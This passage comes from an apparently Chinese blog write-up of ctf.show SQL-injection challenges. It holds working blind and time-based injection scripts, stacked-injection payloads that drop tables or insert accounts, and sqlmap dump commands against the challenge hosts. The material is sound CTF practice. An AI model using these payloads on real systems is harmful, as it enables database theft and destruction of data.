flagstr:</span><br><span class="line">        <span class="comment">#payload = &quot;admin&#x27;and ((left((select database()),&#123;&#125;)=&#x27;&#123;&#125;&#x27;))#&quot;.format(i,tempstr+mid)</span></span><br><span class="line">        <span class="comment">#ctfshow_web</span></span><br><span class="line">        <span class="comment">#payload = &quot;admin&#x27;and ((left((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;)=&#x27;&#123;&#125;&#x27;))#&quot;.format(i,tempstr+mid)</span></span><br><span class="line">        <span class="comment">#ctfshow_flxg</span></span><br><span class="line">        <span class="comment">#payload = &quot;admin&#x27;and ((left((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flxg&#x27;),&#123;&#125;)=&#x27;&#123;&#125;&#x27;))#&quot;.format(i,tempstr+mid)</span></span><br><span class="line">        <span class="comment">#id,f1ag</span></span><br><span class="line">        payload = <span class="string">&quot;admin&#x27;and ((left((select f1ag from ctfshow_flxg),&#123;&#125;)=&#x27;&#123;&#125;&#x27;))#&quot;</span>.<span class="built_in">format</span>(i,tempstr+mid)</span><br><span class="line"></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>:payload,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>:<span class="number">0</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">#&#123;&#x27;username&#x27;: &quot;admin&#x27;and ((substr((select f1ag from ctfshow_fl0g),1,1)=&#x27;O&#x27;))#&quot;, &#x27;password&#x27;: 0&#125;</span></span><br><span class="line">        res = requests.post(url = url,data =data)</span><br><span class="line">        time.sleep(<span class="number">0.3</span>)</span><br><span class="line">        <span class="keyword">if</span> res.text.find(<span class="string">&quot;8bef&quot;</span>)&gt;<span class="number">0</span>:</span><br><span class="line">            tempstr += mid</span><br><span class="line">            flag += mid</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;++++++++++++++++++++&quot;</span>+flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#ctfshow&#123;2bc86f71-2a58-45b2-8573-940ddffa99d2&#125;</span></span><br></pre></td></tr></table></figure><p>这里用tempstr参数的原因是，left函数不能一个一个的遍历，这个函数是直接输出长度为多少的字符串，所以我们得找一个参数来暂时存起来，然后在和新的拼接在一起。</p><h2 id="web194"><a href="#web194" class="headerlink" title="web194"></a>web194</h2><p>源码</p><p><img src="../images/image-20221230220314140.png" alt="image-20221230220314140"></p><p>过滤了挺多东西的。这道题可以使用   lpad   函数</p><p><img src="../images/image-20221230220532917.png" alt="image-20221230220532917"></p><p><img src="../images/image-20221230220638283.png" alt="image-20221230220638283"></p><p>其实和left差不多，只是加了一个空命令。</p><p>脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: k1he</span></span><br><span class="line"><span class="comment"># @Date:   2021-09-18 21:01:32</span></span><br><span class="line"><span class="comment"># @Last Modified by:   k1he</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2022-01-14 01:24:27</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://ae098689-0aa3-490f-9ece-da1a4ef3eaa4.challenge.ctf.show/api/index.php&quot;</span></span><br><span class="line"></span><br><span class="line">flagstr = <span class="string">&quot;,_&#125;&#123;abcdefghijklmnopqr-stuvwxyz0123456789&quot;</span></span><br><span class="line">tempstr = <span class="string">&quot;&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">60</span>):</span><br><span class="line">    <span class="keyword">for</span> mid <span class="keyword">in</span> flagstr:</span><br><span class="line">        <span class="comment">#payload = &quot;admin&#x27;and ((left((select database()),&#123;&#125;)=&#x27;&#123;&#125;&#x27;))#&quot;.format(i,tempstr+mid)</span></span><br><span class="line">        <span class="comment">#ctfshow_web</span></span><br><span class="line">        <span class="comment">#payload = &quot;admin&#x27;and ((left((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;)=&#x27;&#123;&#125;&#x27;))#&quot;.format(i,tempstr+mid)</span></span><br><span class="line">        <span class="comment">#ctfshow_flxg</span></span><br><span class="line">        <span class="comment">#payload = &quot;admin&#x27;and ((left((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flxg&#x27;),&#123;&#125;)=&#x27;&#123;&#125;&#x27;))#&quot;.format(i,tempstr+mid)</span></span><br><span class="line">        <span class="comment">#id,f1ag</span></span><br><span class="line">        payload = <span class="string">&quot;admin&#x27;and ((lpad((select f1ag from ctfshow_flxg),&#123;&#125;,&#x27;&#x27;)=&#x27;&#123;&#125;&#x27;))#&quot;</span>.<span class="built_in">format</span>(i,tempstr+mid)</span><br><span class="line"></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>:payload,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>:<span class="number">0</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">#&#123;&#x27;username&#x27;: &quot;admin&#x27;and ((substr((select f1ag from ctfshow_fl0g),1,1)=&#x27;O&#x27;))#&quot;, &#x27;password&#x27;: 0&#125;</span></span><br><span class="line">        res = requests.post(url = url,data =data)</span><br><span class="line">        time.sleep(<span class="number">0.3</span>)</span><br><span class="line">        <span class="keyword">if</span> res.text.find(<span class="string">&quot;8bef&quot;</span>)&gt;<span class="number">0</span>:</span><br><span class="line">            tempstr += mid</span><br><span class="line">            flag += mid</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;++++++++++++++++++++&quot;</span>+flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#ctfshow&#123;2bc86f71-2a58-45b2-8573-940ddffa99d2&#125;</span></span><br></pre></td></tr></table></figure><h2 id="web195-堆叠注入"><a href="#web195-堆叠注入" class="headerlink" title="web195(堆叠注入)"></a>web195(堆叠注入)</h2><p>源码</p><p><img src="../images/image-20221230225635015.png" alt="image-20221230225635015"></p><p>这道题用的是堆叠注入的知识点。</p><p><img src="../images/image-20221230225706757.png" alt="image-20221230225706757"></p><p>wp是利用update函数来更新数据库里的密码。</p><p><img src="../images/image-20221230225901741.png" alt="image-20221230225901741"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">``      这个符号可以替代空格。</span><br></pre></td></tr></table></figure><p><img src="../images/image-20221230230250480.png" alt="image-20221230230250480"></p><h2 id="web196"><a href="#web196" class="headerlink" title="web196"></a>web196</h2><p>源码</p><p><img src="../images/image-20221230230414378.png" alt="image-20221230230414378"></p><p><img src="../images/image-20221230231811538.png" alt="image-20221230231811538"></p><p><img src="../images/image-20221230231833992.png" alt="image-20221230231833992"></p><p>通过这一点可以来进行判断。</p><p><img src="../images/image-20221230231919859.png" alt="image-20221230231919859"></p><p>这里的select并没有被过滤。</p><p><img src="../images/image-20221231004615102.png" alt="image-20221231004615102"></p><h2 id="web197"><a href="#web197" class="headerlink" title="web197"></a>web197</h2><p>源码</p><p><img src="../images/image-20221230232106140.png" alt="image-20221230232106140"></p><p>不能用update来更新密码了。</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0;drop table ctfshow_user;</span><br><span class="line">create table ctfshow_user(`username` varchar(100),`pass` varchar(100));</span><br><span class="line">insert ctfshow_user(`username`,`pass`) value(1,2);</span><br></pre></td></tr></table></figure><p>这是先删除掉原来的表，然后在新建一个表，然后在往表里插入东西。</p><p><img src="../images/image-20221230235928061.png" alt="image-20221230235928061"></p><p><img src="../images/image-20221230235936942.png" alt="image-20221230235936942"></p><p>成功执行并且建立了新表和内容。</p><p><img src="../images/image-20221231000026235.png" alt="image-20221231000026235"></p><p>成功执行。</p><h2 id="web198"><a href="#web198" class="headerlink" title="web198"></a>web198</h2><p>源码</p><p><img src="../images/image-20221231000119082.png" alt="image-20221231000119082"></p><p>新建表和更新密码都不能用了。</p><p><strong>解法一</strong></p><p>paylaod</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;insert ctfshow_user(`username`,`pass`) value(2,3);</span><br></pre></td></tr></table></figure><p>通过新插入的账号密码来获得flag。</p><p>然后在username和password处分别输入2，3    就能拿到flag。</p><p><strong>解法二</strong></p><p>通过pass和id列的互相交换，然后把依次爆破pass就好了，username值填0；（弱类型比较）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0;alter table ctfshow_user change column `pass` `tmp` varchar(255);alter table ctfshow_user change column `id` `pass` varchar(255);alter table ctfshow_user change column `tmp` `id` varchar(255)</span><br></pre></td></tr></table></figure><h2 id="web199"><a href="#web199" class="headerlink" title="web199"></a>web199</h2><p>源码</p><p><img src="../images/image-20221231003923901.png" alt="image-20221231003923901"></p><p>这道题的用法类似这个原理</p><p><img src="../images/image-20221231004703865.png" alt="image-20221231004703865"></p><p><strong>解法一</strong></p><p><img src="../images/image-20221231004751742.png" alt="image-20221231004751742"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username  ---&gt;    1;show tables</span><br><span class="line">password  ---&gt;    ctfshow_user</span><br><span class="line">因为就是$row是用来存第二个分号后传的内容的</span><br></pre></td></tr></table></figure><p><strong>解法二</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0;alter table ctfshow_user change column pass tmp text;alter table ctfshow_user change column id pass int;alter table ctfshow_user change column tmp id text</span><br></pre></td></tr></table></figure><p>这个是把varchar类型换成text类型，因为就是varchar需要括号，text不需要括号。</p><p>然后username为0；从0开始爆破password就行。</p><h2 id="web200"><a href="#web200" class="headerlink" title="web200"></a>web200</h2><p>源码</p><p> <img src="../images/image-20221231005222484.png" alt="image-20221231005222484"></p><p>多把一个逗号给过滤掉了。</p><p><strong>解法一</strong></p><p><img src="../images/image-20221231005325134.png" alt="image-20221231005325134"></p><p><strong>解法二</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0;alter table ctfshow_user change column pass tmp text;alter table ctfshow_user change column id pass int;alter table ctfshow_user change column tmp id text</span><br></pre></td></tr></table></figure><h2 id="web201"><a href="#web201" class="headerlink" title="web201"></a>web201</h2><p>源码</p><p><img src="../images/image-20221231212254050.png" alt="image-20221231212254050"></p><p><strong>第一步</strong></p><p>查看是否可以进行注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://1bb5bf5b-d162-49e5-b701-e4eb8c3e851e.challenge.ctf.show/api/?id=&quot; --user-agent=sqlmap --referer=ctf.show</span><br></pre></td></tr></table></figure><p><img src="../images/image-20221231213608213.png" alt="image-20221231213608213"></p><p>说明id可以进行注入了。</p><p><strong>第二步</strong></p><p>查找全部的数据库名。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://1bb5bf5b-d162-49e5-b701-e4eb8c3e851e.challenge.ctf.show/api/?id=&quot; --user-agent=sqlmap --referer=ctf.show --dbs</span><br></pre></td></tr></table></figure><p><img src="../images/image-20221231213740070.png" alt="image-20221231213740070"></p><p><strong>第三步</strong></p><p>查找某个数据库中的表名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://1bb5bf5b-d162-49e5-b701-e4eb8c3e851e.challenge.ctf.show/api/?id=&quot; --user-agent=sqlmap --referer=ctf.show -D ctfshow_web --tables</span><br></pre></td></tr></table></figure><p><img src="../images/image-20221231213901166.png" alt="image-20221231213901166"></p><p><strong>第四步</strong></p><p>查找表中的所有的列名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://1bb5bf5b-d162-49e5-b701-e4eb8c3e851e.challenge.ctf.show/api/?id=&quot; --user-agent=sqlmap --referer=ctf.show -D ctfshow_web -T ctfshow_user --columns</span><br></pre></td></tr></table></figure><p><img src="../images/image-20221231214110487.png" alt="image-20221231214110487"></p><p><strong>第五步</strong></p><p>查看这些列中的内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://1bb5bf5b-d162-49e5-b701-e4eb8c3e851e.challenge.ctf.show/api/?id=&quot; --user-agent=sqlmap --referer=ctf.show -D ctfshow_web -T ctfshow_user --dump</span><br></pre></td></tr></table></figure><p><img src="../images/image-20221231214230587.png" alt="image-20221231214230587"></p><p>拿到flag.</p><h2 id="web202"><a href="#web202" class="headerlink" title="web202"></a>web202</h2><p>源码</p><p><img src="../images/image-20221231214436334.png" alt="image-20221231214436334"></p><p>那就是POST请求了。</p><p><img src="../images/image-20221231214624767.png" alt="image-20221231214624767"></p><p>猜测数据库名和表名也该没改，那么直接就去用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://f61fc87c-d4f4-44bb-a391-52a88766edb9.challenge.ctf.show/api/&quot; --data=&quot;id=1&quot; --referer=ctf.show -D ctfshow_web -T ctfshow_user --dump</span><br></pre></td></tr></table></figure><p><img src="../images/image-20221231215653269.png" alt="image-20221231215653269"></p><p>直接拿到flag.</p><h2 id="web203"><a href="#web203" class="headerlink" title="web203"></a>web203</h2><p>源码</p><p><img src="../images/image-20221231215842405.png" alt="image-20221231215842405"></p><p>这题说是要用method。</p><p><img src="../images/image-20221231215938860.png" alt="image-20221231215938860"></p><p>注意：一定要加上–headers=“Content-Type: text/plain” ，否则是按表单提交的，put接收不到</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://ef1c4fb9-5fb4-45d0-96e6-721fe5bdbce3.challenge.ctf.show/api/index.php&quot; --data=&quot;id=1&quot; --referer=ctf.show --method=PUT --headers=&quot;Content-Type: text/plain&quot; -D ctfshow_web -T ctfshow_user --dump</span><br></pre></td></tr></table></figure><p>(这里我是懒得一步一步的去查数据库和表了，就直接用上一个的了)</p><p><img src="../images/image-20221231221803548.png" alt="image-20221231221803548"></p><h2 id="web204"><a href="#web204" class="headerlink" title="web204"></a>web204</h2><p>源码</p><p><img src="../images/image-20221231222031810.png" alt="image-20221231222031810"></p><p>新增加了个cookie提交。</p><p><img src="../images/image-20221231222112530.png" alt="image-20221231222112530"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这里我也不知道出现啥问题了，直接写的payload在kali下的sqlmap 打不通   拿别人的pl也没用，好奇怪</span><br></pre></td></tr></table></figure><h2 id="web205"><a href="#web205" class="headerlink" title="web205"></a>web205</h2><p>源码</p><p><img src="../images/image-20230101152042762.png" alt="image-20230101152042762"></p><p>通过抓包分析，在每次请求<code>url/api/index.php</code>之前需要先请求<code>URL/api/getTokn.php</code>，大家可以用burpsuite抓包看看确实是这么回事</p><p>所以我们需要两个参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">--safe-url 设置在测试目标地址前访问的安全链接</span><br><span class="line">--safe-freq 设置两次注入测试前访问安全链接的次数</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230101152312909.png" alt="image-20230101152312909"></p><p>摘自Y4tacker师傅的博客   <a href="https://blog.csdn.net/solitudi/article/details/110144623">https://blog.csdn.net/solitudi/article/details/110144623</a></p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://98a8a8b4-a308-4ec4-93e7-b072c3971d27.challenge.ctf.show/api/index.php&quot; --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --dbms=mysql dbs=ctfshow_web -T ctfshow_flax -C flagx --dump  --headers=&quot;Content-Type: text/plain&quot; --safe-url=http://98a8a8b4-a308-4ec4-93e7-b072c3971d27.challenge.ctf.show/api/getToken.php --safe-freq=1</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230101153109959.png" alt="image-20230101153109959"></p><p>这里是直接打payload，师傅们可以按照前面的步骤来一步一步的打。</p><h2 id="web206"><a href="#web206" class="headerlink" title="web206"></a>web206</h2><p>源码</p><p><img src="../images/image-20230101153400105.png" alt="image-20230101153400105"></p><p>这里的话是闭不闭合都无所谓，因为sqlmap会自己判断。</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://0e551b3e-f8f4-4d09-9bbb-5a95ca5f0334.challenge.ctf.show/api/index.php&quot; --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --dbms=mysql -D &quot;ctfshow_web&quot; -T &quot;ctfshow_flaxc&quot; -C &quot;flagv&quot; --dump  --headers=&quot;Content-Type: text/plain&quot; --safe-url=http://0e551b3e-f8f4-4d09-9bbb-5a95ca5f0334.challenge.ctf.show/api/getToken.php --safe-freq=1</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230101153947876.png" alt="image-20230101153947876"></p><p>这里是直接打payload，师傅们可以按照前面的步骤来一步一步的做。</p><h2 id="web207-web213"><a href="#web207-web213" class="headerlink" title="web207  -  web213"></a>web207  -  web213</h2><p>大家可以看看Y4tacker师傅的博客，我就不写了</p><p><a href="https://blog.csdn.net/solitudi/article/details/110144623">https://blog.csdn.net/solitudi/article/details/110144623</a></p><h2 id="web214-时间盲注"><a href="#web214-时间盲注" class="headerlink" title="web214(时间盲注)"></a>web214(时间盲注)</h2><p>源码</p><p><img src="../images/image-20230101170048693.png" alt="image-20230101170048693"></p><p>注入点在url/api/</p><p>群主写的wp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://b435d6fe-5f89-40c5-9d51-c6b900d102e1.challenge.ctf.show/api/index.php&#x27;</span></span><br><span class="line">flagstr=<span class="string">&quot;&#123;&#125;qwertyuiopasdfghjklzxcvbnm-_,0123456789&quot;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">40</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> flagstr:</span><br><span class="line">        <span class="comment">#payload = &quot;if((ascii(substr((select database()),&#123;&#125;,1))=&#123;&#125;),sleep(3),1)#&quot;.format(i,ord(x))</span></span><br><span class="line">        <span class="comment">#ctfshow_web</span></span><br><span class="line">        <span class="comment">#payload = &quot;if((ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))=&#123;&#125;),sleep(3),1)#&quot;.format(i, ord(x))</span></span><br><span class="line">        <span class="comment">#ctfshow_flagx,ctfshow_info</span></span><br><span class="line">        <span class="comment">#payload = &quot;if((ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagx&#x27;),&#123;&#125;,1))=&#123;&#125;),sleep(3),1)#&quot;.format(i,ord(x))</span></span><br><span class="line">        <span class="comment">#id, flaga, inf</span></span><br><span class="line">        payload = <span class="string">&quot;if((ascii(substr((select flaga from ctfshow_flagx),&#123;&#125;,1))=&#123;&#125;),sleep(3),1)#&quot;</span>.<span class="built_in">format</span>(i, <span class="built_in">ord</span>(x))</span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;ip&quot;</span>:payload,</span><br><span class="line">            <span class="string">&quot;debug&quot;</span>:<span class="number">1</span>,</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            res = requests.post(url = url,data = data,timeout=<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            time.sleep(<span class="number">0.3</span>)</span><br><span class="line">            flag+=x</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;----------------------&quot;</span>+flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#try except  ---&gt;这两个是处理异常用的，如果执行sleep(3)了话，那对try来说就是异常了，因为timeout规定的是2s,异常的话就会执行except下的代码。</span></span><br></pre></td></tr></table></figure><p>然后跟着上面的走就能拿到flag了。</p><p>看了这么多脚本的编写，自己也会写一点了(记录一下这个时刻)</p><h2 id="web215"><a href="#web215" class="headerlink" title="web215"></a>web215</h2><p>源码</p><p><img src="../images/image-20230101175616535.png" alt="image-20230101175616535"></p><p>这里提示了用’  ‘   单引号。</p><p>就是同样用单引号给闭合注释掉就行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or xxxxxxxxxx#  ----&gt;这样就可以了。</span><br></pre></td></tr></table></figure><p>那么我们就拿上一题的脚本拿来修改修改就好了。</p><p>脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://d1e3eb87-f09e-4e69-9811-9765e724a946.challenge.ctf.show/api/index.php&#x27;</span></span><br><span class="line">flagstr=<span class="string">&quot;&#123;&#125;qwertyuiopasdfghjklzxcvbnm-_,0123456789&quot;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> flagstr:</span><br><span class="line">        <span class="comment">#payload = &quot;if((ascii(substr((select database()),&#123;&#125;,1))=&#123;&#125;),sleep(3),1)#&quot;.format(i,ord(x))</span></span><br><span class="line">        <span class="comment">#ctfshow_web</span></span><br><span class="line">        <span class="comment">#payload = &quot;&#x27; or if((ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))=&#123;&#125;),sleep(3),1)#&quot;.format(i, ord(x))</span></span><br><span class="line">        <span class="comment">#ctfshow_flagxc,ctfshow_info</span></span><br><span class="line">        <span class="comment">#payload = &quot;&#x27; or if((ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagxc&#x27;),&#123;&#125;,1))=&#123;&#125;),sleep(3),1)#&quot;.format(i,ord(x))</span></span><br><span class="line">        <span class="comment">#id,flagaa,i</span></span><br><span class="line">        payload = <span class="string">&quot;&#x27; or if((ascii(substr((select flagaa from ctfshow_flagxc),&#123;&#125;,1))=&#123;&#125;),sleep(3),1)#&quot;</span>.<span class="built_in">format</span>(i,<span class="built_in">ord</span>(x))</span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;ip&quot;</span>:payload,</span><br><span class="line">            <span class="string">&quot;debug&quot;</span>:<span class="number">1</span>,</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            res = requests.post(url = url,data = data,timeout=<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            time.sleep(<span class="number">0.3</span>)</span><br><span class="line">            flag+=x</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;----------------------&quot;</span>+flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#try except  ---&gt;这两个是处理异常用的，如果执行sleep(3)了话，那对try来说就是异常了，因为timeout规定的是2s,异常的话就会执行except下的代码。</span></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230103185247275.png" alt="image-20230103185247275"></p><p>拿到flag了。</p><h2 id="web216"><a href="#web216" class="headerlink" title="web216"></a>web216</h2><p>源码</p><p><img src="../images/image-20230103190103648.png" alt="image-20230103190103648"></p><p>题目增加了个base64编码，但是影响不大，这样还是可以绕过，抓个包，然后进行下面的分析就能绕过了。</p><p><img src="../images/image-20230103190054969.png" alt="image-20230103190054969"></p><p>修改后的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">url=<span class="string">&#x27;http://18b8abd6-51e2-4fb8-90ce-f2887bc5ab82.challenge.ctf.show/api/index.php&#x27;</span></span><br><span class="line">flagstr=<span class="string">&quot;&#123;&#125;qwertyuiopasdfghjklzxcvbnm-_,0123456789&quot;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> flagstr:</span><br><span class="line">        <span class="comment">#payload = &quot;if((ascii(substr((select database()),&#123;&#125;,1))=&#123;&#125;),sleep(3),1)#&quot;.format(i,ord(x))</span></span><br><span class="line">        <span class="comment">#ctfshow_web</span></span><br><span class="line">        <span class="comment">#payload = &quot;&#x27;abc&#x27;) or if((ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))=&#123;&#125;),sleep(3),1)#&quot;.format(i, ord(x))</span></span><br><span class="line">        <span class="comment">#ctfshow_flagxcc,ct</span></span><br><span class="line">        <span class="comment">#payload = &quot;&#x27;abc&#x27;) or if((ascii(substr((select group_concat(column_name) from information_schema.columns where 